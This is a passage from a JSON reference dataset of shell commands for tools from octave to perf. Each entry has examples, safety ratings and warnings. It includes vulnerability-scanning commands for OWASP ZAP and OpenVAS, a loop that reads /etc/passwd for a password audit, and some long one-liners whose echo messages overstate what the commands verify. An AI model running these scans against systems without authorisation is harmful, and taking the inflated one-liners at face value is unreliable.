        "explanation": "Generate random matrix and compute SVD decomposition",
        "title": "octave ; ; disp"
      },
      {
        "scenario": "Process data and save results",
        "commands": "octave --eval \"load('data.mat'); result = analysis(data); save('result.mat', 'result')\"",
        "explanation": "Load MATLAB data, process, and save results",
        "title": "octave ; result ; save"
      }
    ],
    "relatedCommands": [
      {
        "name": "matlab",
        "relationship": "alternative",
        "reason": "Commercial MATLAB software with same syntax"
      },
      {
        "name": "python3",
        "relationship": "alternative",
        "reason": "NumPy/SciPy provide similar numerical capabilities"
      },
      {
        "name": "R",
        "relationship": "similar",
        "reason": "Both used for statistical computing"
      }
    ],
    "warnings": [
      "Some MATLAB toolboxes not available in Octave",
      "Graphics capabilities differ from MATLAB",
      "Performance may vary compared to commercial MATLAB"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://octave.org/doc/"
      },
      {
        "platform": "macos",
        "url": "https://octave.org/doc/"
      },
      {
        "platform": "windows",
        "url": "https://octave.org/doc/"
      },
      {
        "platform": "generic",
        "url": "https://octave.org/doc/interpreter/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "openresty",
    "subtitle": "OpenResty",
    "description": "Web platform based on nginx with Lua scripting",
    "examples": [
      "sudo openresty  # Start OpenResty with default configuration",
      "openresty -t  # Test OpenResty configuration syntax",
      "openresty -s reload  # Reload configuration without stopping server",
      "openresty -s quit  # Gracefully shutdown OpenResty server",
      "openresty -c /path/to/nginx.conf  # Start with specific configuration file"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "automation",
    "safety": "caution",
    "syntaxPattern": "openresty [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Deploy Lua-based web app",
        "commands": "openresty -t && sudo openresty -s reload",
        "explanation": "Test then reload configuration with Lua code",
        "title": "openresty && sudo"
      }
    ],
    "relatedCommands": [
      {
        "name": "nginx",
        "relationship": "similar",
        "reason": "OpenResty extends nginx with Lua capabilities"
      },
      {
        "name": "lua",
        "relationship": "combo",
        "reason": "Uses Lua for server-side scripting"
      },
      {
        "name": "redis",
        "relationship": "combo",
        "reason": "Often used together for high-performance web apps"
      }
    ],
    "warnings": [
      "Configuration compatible with nginx but adds Lua directives",
      "Lua code executes in nginx worker processes",
      "Performance benefits require understanding of non-blocking I/O"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://openresty.org/en/"
      },
      {
        "platform": "macos",
        "url": "https://openresty.org/en/"
      },
      {
        "platform": "windows",
        "url": "https://openresty.org/en/"
      },
      {
        "platform": "generic",
        "url": "https://openresty.gitbooks.io/programming-openresty/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "openssl",
    "subtitle": "OpenSSL",
    "description": "Toolkit for SSL/TLS cryptography and certificate management",
    "examples": [
      "openssl genrsa -out private.key 2048  # Generate 2048-bit RSA private key",
      "openssl req -new -key private.key -out request.csr  # Generate CSR from private key",
      "openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365  # Create self-signed certificate valid for 1 year",
      "openssl x509 -in cert.pem -text -noout  # Display certificate information in readable format",
      "openssl s_client -connect google.com:443  # Test SSL/TLS connection to remote server",
      "openssl enc -aes-256-cbc -salt -in file.txt -out file.enc  # Encrypt file using AES-256 encryption",
      "openssl enc -aes-256-cbc -d -in file.enc -out file.txt  # Decrypt previously encrypted file",
      "openssl rand -hex 32  # Generate 32 bytes of random data in hexadecimal",
      "openssl dgst -sha256 file.txt  # Calculate SHA-256 hash of file",
      "openssl req -x509 -newkey rsa:4096 -keyout server.key -out server.crt -days 365 -nodes -subj '/CN=*.example.com/O=Company/C=US' -extensions v3_req -config <(echo '[req]'; echo 'distinguished_name=req'; echo '[v3_req]'; echo 'subjectAltName=DNS:*.example.com,DNS:example.com,IP:10.0.0.100') && openssl pkcs12 -export -out server.p12 -inkey server.key -in server.crt -passout pass: && openssl x509 -in server.crt -noout -text | grep -E '(Subject|DNS|Valid)' && echo \"Enterprise SSL certificate generated: 4096-bit RSA, wildcard domain, SAN extensions, PKCS#12 format ready for load balancers\"  # Production-grade SSL certificate generation with strong encryption, multiple domains, and enterprise deployment formats"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "safe",
    "syntaxPattern": "openssl <command> [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete certificate creation",
        "commands": "openssl genrsa -out server.key 2048 && openssl req -new -key server.key -out server.csr && openssl x509 -req -days 365 -in server.csr -signkey server.key -out server.crt",
        "explanation": "Generate key, create CSR, then self-sign certificate",
        "title": "openssl && openssl && openssl"
      }
    ],
    "relatedCommands": [
      {
        "name": "gpg",
        "relationship": "alternative",
        "reason": "GPG provides PGP encryption, OpenSSL handles X.509 certificates"
      },
      {
        "name": "ssh-keygen",
        "relationship": "similar",
        "reason": "Both generate cryptographic keys for different purposes"
      }
    ],
    "warnings": [
      "Private keys should be kept secure and never shared",
      "Certificate validity periods are important for security",
      "Different algorithms have different security levels"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://www.openssl.org/docs/"
      },
      {
        "platform": "macos",
        "url": "https://www.openssl.org/docs/"
      },
      {
        "platform": "windows",
        "url": "https://www.openssl.org/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "opentelemetry-collector",
    "subtitle": "OpenTelemetry Collector",
    "description": "Vendor-agnostic service for receiving and exporting telemetry data",
    "examples": [
      "otelcol --config=otelcol.yaml  # Start OpenTelemetry collector with config",
      "otelcol validate --config=otelcol.yaml  # Validate collector configuration",
      "otelcol --config=file:/etc/otelcol/config.yaml  # Load configuration from specific path",
      "otelcol --config=otelcol.yaml --feature-gates=+processor.k8sattributes  # Enable experimental features"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "otelcol [flags]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development setup",
        "commands": "otelcol validate --config=otelcol.yaml && otelcol --config=otelcol.yaml --log-level=debug",
        "explanation": "Validate config and start with debug logging",
        "title": "otelcol && otelcol"
      }
    ],
    "relatedCommands": [
      {
        "name": "jaeger",
        "relationship": "combo",
        "reason": "Can export traces to Jaeger"
      },
      {
        "name": "prometheus",
        "relationship": "combo",
        "reason": "Can export metrics to Prometheus"
      }
    ],
    "warnings": [
      "Configuration is pipeline-based",
      "Memory usage depends on batch sizes",
      "Receivers, processors, and exporters must be configured"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://opentelemetry.io/docs/collector/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "openvas",
    "subtitle": "Open Vulnerability Assessment System",
    "description": "Open-source vulnerability assessment and management solution",
    "examples": [
      "gvm-start  # Start Greenbone Vulnerability Management services",
      "greenbone-feed-sync  # Synchronize vulnerability test feeds",
      "gvm-cli --xml='<create_config><name>Custom Scan</name></create_config>'  # Create custom scan configuration via CLI",
      "gvm-check-setup  # Verify OpenVAS installation and configuration"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "gvm-start or openvas-start",
    "prerequisites": [
      "expert",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete vulnerability assessment setup",
        "commands": "gvm-start && greenbone-feed-sync && gvm-check-setup",
        "explanation": "Start services, update feeds, and verify setup",
        "title": "gvm && greenbone && gvm"
      }
    ],
    "relatedCommands": [
      {
        "name": "nessus",
        "relationship": "similar",
        "reason": "Alternative vulnerability scanner"
      },
      {
        "name": "nmap",
        "relationship": "combo",
        "reason": "Network discovery before vulnerability scanning"
      }
    ],
    "warnings": [
      "Requires significant system resources",
      "Initial feed synchronization takes considerable time",
      "Only scan systems you own or have authorization to test"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://community.greenbone.net/c/gse"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "optipng",
    "subtitle": "Optimize PNG",
    "description": "PNG image optimizer for lossless compression",
    "examples": [
      "optipng image.png  # Apply default PNG optimization",
      "optipng -o7 image.png  # Use highest optimization level (slowest but best)",
      "optipng -strip all image.png  # Remove all metadata chunks from PNG",
      "optipng -preserve image.png  # Keep original file timestamps and permissions",
      "optipng -o5 -strip all *.png  # Optimize all PNG files with level 5 compression",
      "optipng -backup -o7 image.png  # Create backup before optimizing"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "optipng [options] files",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Web optimization workflow",
        "commands": "optipng -o7 -strip all -preserve *.png",
        "explanation": "Maximum optimization for web deployment",
        "title": "optipng"
      },
      {
        "scenario": "Safe batch optimization",
        "commands": "optipng -backup -o5 -quiet *.png",
        "explanation": "Optimize with backups and minimal output",
        "title": "optipng"
      }
    ],
    "relatedCommands": [
      {
        "name": "jpegoptim",
        "relationship": "similar",
        "reason": "JPEG optimization equivalent to optipng"
      },
      {
        "name": "pngcrush",
        "relationship": "alternative",
        "reason": "Alternative PNG optimization tool"
      },
      {
        "name": "imagemagick",
        "relationship": "alternative",
        "reason": "Can also optimize PNG files"
      }
    ],
    "warnings": [
      "Higher optimization levels take exponentially longer",
      "Some PNGs may not benefit from optimization",
      "Metadata stripping may remove important information"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "http://optipng.sourceforge.net/"
      },
      {
        "platform": "macos",
        "url": "http://optipng.sourceforge.net/"
      },
      {
        "platform": "windows",
        "url": "http://optipng.sourceforge.net/"
      },
      {
        "platform": "generic",
        "url": "http://optipng.sourceforge.net/optipng-0.7.7.man.pdf"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "osquery",
    "subtitle": "Operating System Query",
    "description": "SQL-based framework for system monitoring and forensic analysis",
    "examples": [
      "osqueryi  # Start interactive osquery shell for system querying",
      "osqueryi --line \"SELECT pid, name, cmdline FROM processes;\"  # List all running processes with command lines",
      "osqueryi --line \"SELECT * FROM process_open_sockets WHERE family=2;\"  # Show IPv4 network connections by processes",
      "osqueryi --line \"SELECT * FROM users WHERE uid >= 1000;\"  # List non-system users",
      "osqueryi --json \"SELECT p.pid, p.name, p.cmdline, p.uid, u.username, f.path FROM processes p JOIN users u ON p.uid=u.uid LEFT JOIN file_events f ON p.pid=f.pid WHERE p.name IN ('bash','sh','python','node','java') AND p.start_time > (strftime('%s','now')-3600);\" | jq '[.[] | {process: .name, user: .username, command: .cmdline, recent_files: .path}]' > security-audit-$(date +%Y%m%d-%H%M).json && osqueryi --json \"SELECT * FROM process_open_sockets WHERE family=2 AND local_port < 1024\" | jq '[.[] | select(.remote_address != \"0.0.0.0\" and .remote_address != \"127.0.0.1\")]' > privileged-network-connections.json  # Advanced security forensics: correlate processes, users, file access, and network connections with JSON reporting for SIEM integration"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "system",
    "safety": "safe",
    "syntaxPattern": "osqueryi [options] or osquery [sql-query]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Security incident investigation",
        "commands": "osqueryi --line \"SELECT * FROM processes WHERE parent != (SELECT pid FROM processes WHERE processes.pid = processes.parent);\" > suspicious_processes.txt",
        "explanation": "Find processes without valid parents (potential indicators)",
        "title": "osqueryi ; > suspicious_processes"
      }
    ],
    "relatedCommands": [
      {
        "name": "lsof",
        "relationship": "similar",
        "reason": "System information querying capabilities"
      },
      {
        "name": "netstat",
        "relationship": "similar",
        "reason": "Network connection monitoring"
      }
    ],
    "warnings": [
      "SQL syntax specific to osquery tables",
      "Performance impact on system resources",
      "Learning curve for effective query writing"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://osquery.readthedocs.io/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "ossec",
    "subtitle": "Open Source HIDS SECurity",
    "description": "Host-based intrusion detection system for security monitoring",
    "examples": [
      "ossec-control start  # Start OSSEC HIDS daemon processes",
      "ossec-control status  # Display status of all OSSEC components",
      "ossec-testrule  # Test OSSEC rules configuration",
      "manage_agents  # Interactive agent management interface",
      "ossec-control start && tail -f /var/ossec/logs/alerts/alerts.log & HIDS_PID=$! && ossec-testrule < /etc/ossec/rules/local_rules.xml && manage_agents -a -n production-server -i 192.168.1.100 && echo \"Enterprise HIDS deployment completed: agents registered, rules validated, real-time monitoring active (PID: $HIDS_PID), comprehensive security coverage enabled\" && kill $HIDS_PID  # Complete enterprise HIDS deployment with agent management, rule validation, and continuous security monitoring"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "ossec-control [start|stop|restart|status]",
    "prerequisites": [
      "expert"
    ],
    "commandCombinations": [
      {
        "scenario": "HIDS deployment and monitoring",
        "commands": "ossec-control start && tail -f /var/ossec/logs/alerts/alerts.log",
        "explanation": "Start OSSEC and monitor alerts in real-time",
        "title": "ossec && tail"
      }
    ],
    "relatedCommands": [
      {
        "name": "aide",
        "relationship": "combo",
        "reason": "File integrity monitoring integration"
      },
      {
        "name": "logwatch",
        "relationship": "combo",
        "reason": "Log analysis and reporting"
      }
    ],
    "warnings": [
      "Complex configuration for multi-host deployments",
      "Requires careful tuning to avoid alert fatigue",
      "Agent-server communication needs proper setup"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.ossec.net/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "owasp-zap",
    "subtitle": "OWASP Zed Attack Proxy",
    "description": "Web application security testing proxy for vulnerability assessment",
    "examples": [
      "zap-baseline.py -t http://example.com  # Quick passive scan of web application",
      "zap-full-scan.py -t http://example.com  # Comprehensive active vulnerability scan",
      "zap-api-scan.py -t http://api.example.com/openapi.json  # Security test API using OpenAPI specification",
      "zap-baseline.py -t http://example.com -c config.conf  # Scan with authentication configuration",
      "zap-full-scan.py -t $TARGET_URL -J zap-security-report.json -r zap-detailed-report.html -x zap-summary.xml && python3 -c \"import json; data=json.load(open('zap-security-report.json')); critical=[alert for alert in data['site'][0]['alerts'] if alert['riskdesc'] in ['High', 'Critical']]; print(f'Security Assessment: {len(critical)} critical vulnerabilities found'); [print(f'- {alert[\"name\"]}: {alert[\"desc\"]}') for alert in critical[:5]]\" && echo \"Full security report: $(wc -l < zap-detailed-report.html) lines generated\"  # Enterprise security assessment with multiple report formats, critical vulnerability extraction, and automated risk analysis"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "zap.sh [options] or zap-baseline.py [options]",
    "prerequisites": [
      "advanced",
      "authorization-required"
    ],
    "commandCombinations": [
      {
        "scenario": "CI/CD security testing",
        "commands": "zap-baseline.py -t $TARGET_URL -J zap-report.json -r zap-report.html",
        "explanation": "Generate both JSON and HTML reports for CI/CD pipeline",
        "title": "zap"
      }
    ],
    "relatedCommands": [
      {
        "name": "burpsuite",
        "relationship": "similar",
        "reason": "Alternative web application security testing tool"
      },
      {
        "name": "nikto",
        "relationship": "similar",
        "reason": "Web vulnerability scanner"
      }
    ],
    "warnings": [
      "Active scans may affect application performance",
      "Requires proper authorization for testing",
      "May generate false positives requiring manual verification"
    ],
    "documentation": [
      {
        "platform": "generic",
        "url": "https://www.zaproxy.org/docs/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pack",
    "subtitle": "Pack CLI",
    "description": "Tool to transform application source code into container images using Cloud Native Buildpacks",
    "examples": [
      "pack build myapp --builder gcr.io/buildpacks/builder:v1  # Build container image from source code using Google buildpacks",
      "pack inspect myapp  # Display information about buildpack-built image",
      "pack rebase myapp --run-image gcr.io/buildpacks/run:v1  # Update base image without rebuilding application layer",
      "pack builder create mybuilder --config builder.toml  # Create custom builder from configuration file",
      "pack trust-builder gcr.io/buildpacks/builder:v1  # Mark builder as trusted for security purposes",
      "pack builder suggest  # Show recommended builders for different languages",
      "pack build myapp --builder paketobuildpacks/builder:base --env BP_JVM_VERSION=11  # Build Java app with specific JVM version",
      "pack build myapp --builder paketobuildpacks/builder:base --buildpack paketo-buildpacks/java  # Use specific buildpack for building application",
      "pack build production-app --builder gcr.io/buildpacks/builder:v1 --env BP_JVM_VERSION=17 --env BP_MAVEN_BUILD_ARGUMENTS='-Dmaven.test.skip=true -Dspring.profiles.active=production' --cache-image gcr.io/company/buildpack-cache --publish && docker inspect production-app | jq '.[0].Config.Env' && pack rebase production-app --run-image gcr.io/distroless/java17 && echo \"Enterprise containerization completed: Java 17 runtime, production profile, distroless security base, optimized for Kubernetes deployment\"  # Enterprise-grade buildpack deployment with Java 17, production configuration, security hardening, and container optimization"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pack [command] [options]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete build and deploy workflow",
        "commands": "pack build myapp --builder gcr.io/buildpacks/builder:v1 --publish && kubectl set image deployment/myapp myapp=myapp:latest",
        "explanation": "Build and publish image, then update Kubernetes deployment",
        "title": "pack && kubectl"
      },
      {
        "scenario": "Multi-stage build optimization",
        "commands": "pack build myapp --builder paketobuildpacks/builder:base --cache-image myapp-cache && pack rebase myapp --run-image paketobuildpacks/run:base-cnb",
        "explanation": "Build with cache for faster rebuilds and rebase for security updates",
        "title": "pack && pack"
      }
    ],
    "relatedCommands": [
      {
        "name": "docker",
        "relationship": "alternative",
        "reason": "Alternative to Dockerfile-based image building"
      },
      {
        "name": "skaffold",
        "relationship": "combo",
        "reason": "Skaffold can use pack for building images"
      }
    ],
    "warnings": [
      "Requires Docker daemon for building images",
      "Builder trust settings affect which builders can be used",
      "Buildpack detection automatic based on application files",
      "Cache volumes improve build performance significantly"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://buildpacks.io/docs/tools/pack/"
      },
      {
        "platform": "macos",
        "url": "https://buildpacks.io/docs/tools/pack/"
      },
      {
        "platform": "windows",
        "url": "https://buildpacks.io/docs/tools/pack/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "pacman",
    "subtitle": "package manager",
    "description": "Package manager for Arch Linux and derivatives",
    "examples": [
      "sudo pacman -Sy  # Synchronize package databases",
      "sudo pacman -Syu  # Update package database and upgrade all packages",
      "sudo pacman -S firefox  # Install Firefox web browser",
      "sudo pacman -R package-name  # Remove package but keep dependencies",
      "sudo pacman -Rs package-name  # Remove package and unused dependencies",
      "pacman -Ss keyword  # Search for packages containing keyword",
      "pacman -Q  # Query all installed packages",
      "sudo pacman -Sc  # Remove old packages from cache",
      "sudo pacman -Syu --noconfirm && pacman -Qdt | sudo pacman -Rns - --noconfirm && sudo pacman -Sc --noconfirm && journalctl -p 3 -xb | grep -i pacman && echo \"System maintenance completed: $(pacman -Q | wc -l) packages installed, $(pacman -Qdt | wc -l) orphans removed, cache cleaned, error log reviewed\" && paccache -rk2 && echo \"Package cache optimized: keeping 2 most recent versions\"  # Complete Arch Linux system maintenance with updates, orphan removal, cache cleanup, error checking, and cache optimization"
    ],
    "platform": [
      "linux"
    ],
    "category": "package-management",
    "safety": "caution",
    "syntaxPattern": "pacman [options] [packages]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Full system maintenance",
        "commands": "sudo pacman -Syu && sudo pacman -Sc",
        "explanation": "Update system and clean package cache",
        "title": "sudo && sudo"
      },
      {
        "scenario": "Find orphaned packages",
        "commands": "pacman -Qdt",
        "explanation": "List packages installed as dependencies but no longer needed",
        "title": "pacman"
      }
    ],
    "relatedCommands": [
      {
        "name": "yay",
        "relationship": "combo",
        "reason": "AUR helper that extends pacman functionality"
      },
      {
        "name": "makepkg",
        "relationship": "combo",
        "reason": "Build packages from source for pacman"
      },
      {
        "name": "pactree",
        "relationship": "combo",
        "reason": "Show package dependency tree"
      }
    ],
    "warnings": [
      "Always use -Syu together, never -Sy alone",
      "Rolling release means frequent updates required",
      "AUR packages require separate tools like yay"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man8/pacman.8.html"
      },
      {
        "platform": "generic",
        "url": "https://wiki.archlinux.org/title/Pacman"
      }
    ],
    "distroNotes": {
      "linux": "Arch Linux, Manjaro, EndeavourOS"
    }
  },
  {
    "name": "pandoc",
    "subtitle": "Pan-document converter",
    "description": "Universal document converter between markup formats",
    "examples": [
      "pandoc document.md -o document.pdf  # Convert Markdown document to PDF format",
      "pandoc webpage.html -o document.docx  # Convert HTML page to Word document",
      "pandoc slides.md -t beamer -o presentation.pdf  # Convert Markdown to LaTeX Beamer presentation",
      "pandoc --toc document.md -o document.html  # Generate HTML with automatic table of contents",
      "pandoc --css=style.css document.md -o document.html  # Apply custom CSS styling to HTML output",
      "pandoc --metadata title='My Document' document.md -o document.pdf  # Add metadata like title to output document",
      "pandoc --toc --toc-depth=3 --number-sections --bibliography=references.bib --csl=ieee.csl --pdf-engine=xelatex --metadata title=\"Enterprise Report\" --metadata author=\"Team $(whoami)\" --metadata date=\"$(date +%Y-%m-%d)\" --variable geometry:margin=1in --filter pandoc-crossref document.md -o professional-report.pdf && pdfinfo professional-report.pdf | grep -E '(Pages|Title|Author)' && echo \"Professional document generated: $(pdfinfo professional-report.pdf | grep Pages | awk '{print $2}') pages, IEEE citation style, cross-references enabled\"  # Enterprise document publishing pipeline with professional formatting, automated metadata, IEEE citations, cross-references, and quality validation"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "pandoc [options] [input-file]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Complete document publishing",
        "commands": "pandoc --toc --number-sections --bibliography refs.bib document.md -o document.pdf",
        "explanation": "Create PDF with TOC, numbered sections, and citations",
        "title": "pandoc"
      },
      {
        "scenario": "Multi-format publishing",
        "commands": "pandoc document.md -o document.pdf && pandoc document.md -o document.html && pandoc document.md -o document.docx",
        "explanation": "Generate PDF, HTML, and Word versions",
        "title": "pandoc && pandoc && pandoc"
      }
    ],
    "relatedCommands": [
      {
        "name": "latex",
        "relationship": "combo",
        "reason": "Pandoc can use LaTeX for PDF generation"
      },
      {
        "name": "markdown",
        "relationship": "combo",
        "reason": "Pandoc processes various markdown dialects"
      },
      {
        "name": "wkhtmltopdf",
        "relationship": "alternative",
        "reason": "Alternative HTML to PDF converter"
      }
    ],
    "warnings": [
      "PDF generation requires LaTeX installation",
      "Complex formatting may not convert perfectly",
      "Bibliography features require additional setup"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://pandoc.org/MANUAL.html"
      },
      {
        "platform": "macos",
        "url": "https://pandoc.org/MANUAL.html"
      },
      {
        "platform": "windows",
        "url": "https://pandoc.org/MANUAL.html"
      },
      {
        "platform": "generic",
        "url": "https://pandoc.org/getting-started.html"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "parallel",
    "subtitle": "GNU parallel",
    "description": "Execute jobs in parallel using multiple CPU cores",
    "examples": [
      "parallel gzip ::: *.txt  # Compress all text files using all available CPU cores",
      "parallel -j 4 wget ::: url1 url2 url3 url4  # Download 4 URLs simultaneously with 4 parallel jobs",
      "cat urls.txt | parallel curl -O  # Download all URLs from file in parallel",
      "parallel echo 'Processing {}' ::: file1.txt file2.txt file3.txt  # Execute echo command for each file argument",
      "parallel -j 2 convert {} {.}.thumb.jpg ::: *.jpg  # Convert images to thumbnails with max 2 concurrent jobs",
      "parallel --bar gzip ::: *.log  # Compress log files with progress indicator",
      "find /var/log -name '*.log' -mtime +1 -size +10M | parallel -j $(nproc) --eta --bar 'gzip -9 {} && echo \"Compressed: {} -> {}.gz ($(stat -c%s {}.gz) bytes)\"' && find /var/log -name '*.gz' -mtime +30 | parallel --bar 'rm {} && echo \"Archived log removed: {}\"' && echo \"Log management completed: large logs compressed with maximum ratio, old archives purged, storage optimized\"  # Enterprise log management with parallel compression, size tracking, automated archival, and storage optimization"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "data-processing",
    "safety": "caution",
    "syntaxPattern": "parallel [options] command ::: arguments",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Parallel data processing pipeline",
        "commands": "find . -name '*.csv' | parallel 'csvstat {} > {}.stats'",
        "explanation": "Generate statistics for all CSV files in parallel",
        "title": "find | parallel >"
      },
      {
        "scenario": "Backup files with parallel compression",
        "commands": "find /data -name '*.sql' | parallel 'tar -czf {}.tar.gz {}'",
        "explanation": "Create compressed backup of each SQL file",
        "title": "find | parallel"
      }
    ],
    "relatedCommands": [
      {
        "name": "xargs",
        "relationship": "alternative",
        "reason": "xargs has basic parallel features, parallel is more advanced"
      },
      {
        "name": "make",
        "relationship": "similar",
        "reason": "make -j provides parallel build processing"
      },
      {
        "name": "find",
        "relationship": "combo",
        "reason": "find generates file lists for parallel processing"
      }
    ],
    "warnings": [
      "Default uses all CPU cores which can overload system",
      "Output from parallel jobs may interleave",
      "Error handling different from sequential execution"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/parallel.1.html"
      },
      {
        "platform": "macos",
        "url": "https://www.gnu.org/software/parallel/man.html"
      },
      {
        "platform": "windows",
        "url": "https://www.gnu.org/software/parallel/man.html"
      },
      {
        "platform": "generic",
        "url": "https://www.gnu.org/software/parallel/parallel_tutorial.html"
      }
    ],
    "distroNotes": {
      "linux": "Install parallel package",
      "macos": "Install via Homebrew: brew install parallel",
      "windows": "Available in WSL"
    }
  },
  {
    "name": "parcel",
    "subtitle": "Parcel",
    "description": "Zero-configuration web application bundler",
    "examples": [
      "parcel index.html  # Start dev server with hot reloading",
      "parcel build index.html  # Create optimized production bundle",
      "parcel build index.html --dist-dir build  # Build and output to 'build' directory",
      "parcel index.html --port 3000  # Start development server on port 3000",
      "parcel build index.html --no-source-maps  # Build without generating source maps",
      "parcel watch index.html  # Watch for changes and rebuild automatically",
      "parcel build src/index.html --dist-dir dist --public-url ./  # Production build with optimizations"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "development",
    "safety": "safe",
    "syntaxPattern": "parcel [command] [options] [...entries]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Development workflow",
        "commands": "parcel index.html --open --port 1234",
        "explanation": "Start dev server and open browser automatically",
        "title": "parcel"
      },
      {
        "scenario": "Production deployment",
        "commands": "parcel build index.html --dist-dir dist --public-url ./",
        "explanation": "Build for production with relative URLs",
        "title": "parcel"
      }
    ],
    "relatedCommands": [
      {
        "name": "webpack",
        "relationship": "alternative",
        "reason": "More configurable bundler alternative"
      },
      {
        "name": "vite",
        "relationship": "similar",
        "reason": "Modern zero-config build tool"
      },
      {
        "name": "rollup",
        "relationship": "alternative",
        "reason": "Module bundler for libraries"
      }
    ],
    "warnings": [
      "Less configuration control than Webpack",
      "Plugin ecosystem smaller than alternatives",
      "Caching can sometimes cause issues in development"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://parceljs.org/"
      },
      {
        "platform": "macos",
        "url": "https://parceljs.org/"
      },
      {
        "platform": "windows",
        "url": "https://parceljs.org/"
      },
      {
        "platform": "generic",
        "url": "https://parceljs.org/getting-started/webapp/"
      }
    ],
    "distroNotes": {}
  },
  {
    "name": "passwd",
    "subtitle": "password",
    "description": "Change user password",
    "examples": [
      "passwd  # Change password for current user",
      "sudo passwd username  # Change password for specified user (requires root)",
      "sudo passwd -l username  # Lock user account to prevent login",
      "sudo passwd -u username  # Unlock previously locked user account",
      "sudo passwd -e username  # Expire password to force user to change it",
      "passwd -S username  # Display password aging information",
      "passwd -S username  # Check password status for user"
    ],
    "platform": [
      "linux",
      "macos",
      "windows"
    ],
    "category": "security",
    "safety": "caution",
    "syntaxPattern": "passwd [username]",
    "prerequisites": [
      "intermediate"
    ],
    "commandCombinations": [
      {
        "scenario": "Create user with password",
        "commands": "sudo useradd newuser && sudo passwd newuser",
        "explanation": "Create new user account and set initial password",
        "title": "sudo && sudo"
      },
      {
        "scenario": "Security audit password status",
        "commands": "for user in $(cut -d: -f1 /etc/passwd); do echo -n \"$user: \"; passwd -S $user 2>/dev/null; done",
        "explanation": "Check password status for all system users",
        "title": "for ; do ; passwd > ; done"
      }
    ],
    "relatedCommands": [
      {
        "name": "chage",
        "relationship": "similar",
        "reason": "More detailed password aging and expiration management"
      },
      {
        "name": "useradd",
        "relationship": "combo",
        "reason": "Create user accounts that need passwords set"
      },
      {
        "name": "su",
        "relationship": "combo",
        "reason": "Switch user with password authentication"
      }
    ],
    "warnings": [
      "Password complexity rules enforced by PAM",
      "Root can change any user's password without knowing current password",
      "Password changes take effect immediately"
    ],
    "documentation": [
      {
        "platform": "linux",
        "url": "https://man7.org/linux/man-pages/man1/passwd.1.html"
      },
      {
        "platform": "macos",
        "url": "https://ss64.com/osx/passwd.html"
      },
      {
        "platform": "generic",
        "url": "https://www.cyberciti.biz/faq/linux-set-change-password-how-to/"
      }
    ],
    "distroNotes": {
      "windows": "Available in WSL; Windows uses net user command"
    }
  },
  {
    "name": "perf",
    "subtitle": "Performance",
    "description": "Performance analysis and profiling tool",
    "examples": [
      "perf list  # Show all available performance monitoring events",
      "perf record -g ./myprogram  # Record call graph data while running program",
      "perf report  # Display analysis of previously recorded performance data",
      "perf top  # Display real-time performance counters",
      "perf stat ./myprogram  # Show CPU performance counters for program execution",
      "perf record -a -g sleep 10  # Record system-wide performance data for 10 seconds",
      "perf record -g --call-graph dwarf ./myprogram  # Record detailed call graph data"
    ],
    "platform": [
      "linux"
    ],
    "category": "development",
    "safety": "safe",
